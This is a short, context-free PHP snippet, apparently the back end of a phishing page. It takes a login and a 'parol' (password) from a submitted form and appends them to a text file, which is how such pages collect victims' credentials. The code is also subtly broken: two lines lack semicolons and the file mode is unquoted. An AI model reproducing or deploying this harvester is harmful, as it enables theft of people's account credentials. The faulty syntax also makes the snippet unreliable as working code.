 
$login = $_POST['login']
$pass = $_POST['parol']

 
$f = fopen('file.txt', a);
fputs($f, $login."|".$pass);
fclose($f);
